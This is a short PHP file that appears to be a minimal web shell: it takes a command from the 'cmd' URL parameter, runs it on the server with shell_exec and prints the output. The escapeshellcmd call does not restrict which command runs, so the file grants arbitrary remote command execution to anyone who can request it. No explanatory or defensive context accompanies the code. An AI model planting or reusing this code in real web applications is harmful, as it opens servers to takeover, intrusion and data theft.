<?php
$command = $_GET["cmd"];
$safe_command = escapeshellcmd($command);
$output = shell_exec($safe_command);
echo "<pre>$output</pre>";
?>
